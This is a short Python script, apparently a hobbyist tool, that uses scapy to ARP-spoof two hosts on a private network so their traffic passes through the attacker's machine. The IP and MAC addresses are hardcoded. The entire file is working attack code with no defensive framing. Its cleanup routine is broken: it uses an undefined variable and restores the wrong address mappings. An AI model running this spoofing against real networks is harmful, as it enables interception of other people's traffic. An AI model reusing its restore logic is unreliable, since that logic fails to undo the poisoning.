#!/usr/bin/env python

import scapy.all as scapy
import time

target_ip_1 = "192.168.43.1"
target_ip_2 = "192.168.43.215"
target_mac_1 = "66:44:0e:47:6a:2c"
target_mac_2 = "00:e0:23:0d:73:4d"
my_ip = "192.168.43.129"

def spoof(target_ip, target_mac, spoof_ip):
	packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet)

def restore(dest_ip, dest_mac ,source_ip):
	packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet)

try:
	print("[+] Start spoof")
	while True:
		spoof(target_ip_1, target_mac_1, target_ip_2)
		spoof(target_ip_2, target_mac_2, target_ip_1)
		time.sleep(2)
except KeyboardInterrupt:
	print("[-] Exit")
	restore(target_ip_1, target_mac_1, my_ip)
	restore(target_ip_2, target_mac_2, my_ip)
